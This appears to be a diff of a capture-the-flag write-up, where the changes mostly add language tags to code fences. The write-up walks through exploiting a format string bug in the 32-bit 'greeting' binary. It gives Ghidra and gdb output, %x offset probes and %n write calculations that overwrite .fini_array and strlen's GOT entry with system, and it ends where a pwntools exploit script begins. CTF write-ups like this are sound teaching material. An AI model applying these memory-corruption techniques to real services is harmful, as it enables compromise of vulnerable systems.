@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```console
 $    file greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
 greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped
 $    pwn checksec greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
@@ -16,7 +16,7 @@ $    pwn checksec greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aa
 
 So we are dealing with a `32` bit binary, with a stack canary and non executable stack (but no RELRO or PIE). Let's see what happens when we run the binary:
 
-```
+```console
 ./greeting
 Hello, I'm nao!
 Please tell me your name... guyinatuxedo
@@ -25,7 +25,7 @@ Nice to meet you, guyinatuxedo :)
 
 
 So we can see that we are prompted for input, which it prints back out to us. Let's take a look at the binary in Ghidra:
-```
+```c
 void main(void)
 
 {
@@ -56,7 +56,7 @@ void main(void)
 So we can see that in the `main` function, it runs the `getnline` function which scans in input and returns the amount of bytes read (I will cover that function next). It scans in data into the `name` char buffer. Proceeding that if `getnline` didn't scan in `0` bytes, it will write the string `"Nice to meet you, " + ourInput + " :)\n"` to `printedString`, then prints it using `printf`. Thing is since in the `printf` call it doesn't specify a format to print the input, this is a format string bug and we can specify how our input is printed. Using the `%n` flag with printf, we can actually write to memory. Since RELRO isn't enabled, we can write to the GOT table (the GOT Table is a table of addresses in the binary that hold libc address functions), and since PIE isn't enabled we know the addresses of the GOT table.
 
 Looking at the `getnline` function, we see this:
-```
+```c
 void getnline(char *ptr,int bytesRead)
 
 {
@@ -76,7 +76,7 @@ It just scans in `bytesRead` amount of data (in our case `0x40` or `64` so no ov
 
 Now the next thing we need will be a function to overwrite a got entry with. Looking through the list of imports in ghidra (imported functions are included in the compiled binary code, and since pie isn't enabled we know the addresses of those functions) we can see that `system` is imported, and is at the address `0x8048490` in the plt table:
 
-```
+```c
                              **************************************************************
                              *                       THUNK FUNCTION                       *
                              **************************************************************
@@ -92,14 +92,14 @@ Now the next thing we need will be a function to overwrite a got entry with. Loo
 ```
 
 We can also find the address using `objdump`:
-```
+```console
 $    objdump -D greeting | grep system
 08048490 <system@plt>:
  8048779:    e8 12 fd ff ff           call   8048490 <system@plt>
 ```
 
 So we will overwrite a got entry of a function with `system` to call it. The question is now which function to overwrite? Now we run into a different problem. The only function called after the `printf` call which gives us a format string write, is `__stack_chk_fail()` which will only get called if we execute a buffer overflow which we really can't do right now. We will overcome this by writing to the `.fini_array`, which contains an array of functions which are executed sometime after main returns. We will just write to it the address which starts the setup for the `getnline` function, to essentially wrap back around. We can find the `.fini_array` using gdb while running the program:
-```
+```gdb
 gef➤  info file
 Symbols from "/Hackery/all/tw16/greeting".
 Native process:
@@ -209,13 +209,13 @@ Local exec file:
 
 Through all of that we can see that the `.fini_array` is at `0x8049934`:
 
-```
+```text
     0x08049934 - 0x08049938 is .fini_array
 ```
 
 For the address we will loop back to, I choose `0x8048614`. This is the start of the setup for the `getnline` function call, and through trial and error we can see that it doesn't crash when we loop back here:
 
-```
+```c
         0804860f e8 3c fe        CALL       printf                                           int printf(char * __format, ...)
                  ff ff
         08048614 c7 44 24        MOV        dword ptr [ESP + local_ac],0x40
@@ -229,20 +229,20 @@ For the address we will loop back to, I choose `0x8048614`. This is the start of
 
 Now brings up the question of which function's got address will we overwrite. Since the function system takes a single argument (a char pointer), ideally it would be a function that takes a single argument that is a char pointer to our input. I decided to go with the `strlen`, since in `getnline` it is called with a char pointer to our input. In addition to that, it isn't called somewhere else that would cause a crash with what we are doing. In Ghidra looking at the `.got.plt` memory region, we can see that the `got` entry is at `0x8049a54`:
 
-```
+```nasm
                              PTR_strlen_08049a54                             XREF[1]:     strlen:080484c0  
         08049a54 20 a0 04 08     addr       strlen                                           = ??
 ```
 
 We can also find it using `objdump`:
-```
+```console
 $    objdump -R greeting | grep system
 08049a48 R_386_JUMP_SLOT   system@GLIBC_2.0
 ```
 
 So now the last part I need to cover is actually exploiting the format string bug. I did this by hand, and it tends to get a bit grindy. The first thing we need to do is find our input in reference to the `printf` call, which we can do using the `%x` flag:
 
-```
+```console
 ./greeting-1da3bd8f02ee33a89b6f998afbbcc55de162d88c95dbe6a8724aaaea7671cb4c
 Hello, I'm nao!
 Please tell me your name... 0000111122223333.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
@@ -250,7 +250,7 @@ Nice to meet you, 0000111122223333.80487d0.ff8c4e3c.0.0.0.0.6563694e.206f7420.74
 ```
 
 So we can see our input popping up `3030202c.31313030.32323131.33333232` (`1` = `0x31`, `2` = `0x32`, `0`=`0x30`). Through a bit of shifting around values, we can find that the format string `xx0000111122223333` gives us what we need.
-```
+```console
 ./greeting
 Hello, I'm nao!
 Please tell me your name... xx0000111122223333.%12$x.%13$x.%14$x.%15$x
@@ -261,7 +261,7 @@ Now when printf writes a value, it will write the amount of bytes it has printed
 
 Now when I ran the exploit below hand, these are the values that are written by default. At this point I know everything I need to write the exploit, except the extra number of bytes I need to print to write the correct values (to print `13` bytes we can just specify the format string `%13x`):
 
-```
+```gdb
 gef➤  x/x 0x8049934
 0x8049934:    0x00240024
 gef➤  x/x 0x8049a54
@@ -272,7 +272,7 @@ The first write I do is the the lower two bytes of the `.fini_array` address `0x
 
 When we try to write the higher two bytes, we run into a bit of an issue:
 
-```
+```gdb
 gef➤  x/x 0x8049934
 0x8049934:    0x84908614
 gef➤  x/x 0x8049a54
@@ -281,13 +281,13 @@ gef➤  x/x 0x8049a54
 
 The value it is writing to the higher two bytes is `0x8490`, however the value we need to write is smaller than that `0x0804`. So what we can do is write a larger value to it that contains the value `0x0804`, however the higher portion of that number will end up outside of the area we are writing to it. In order to do this, we will need to print `33652` bytes:
 
-```
+```pycon
 >>> (0x10000 - 0x8490) + 0x804
 33652
 ```
 we can see that the value were writing overflows into other subsequent dwords, however it doesn't really affect us:
 
-```
+```gdb
 gef➤  x/2x 0x8049934
 0x8049934:    0x08048614    0x00000002
 gef➤  x/2x 0x8049a54
@@ -295,7 +295,7 @@ gef➤  x/2x 0x8049a54
 ```
 
 With all of that, we can put it together and we get this exploit:
-```
+```python
 from pwn import *
 
 # Establish the target process
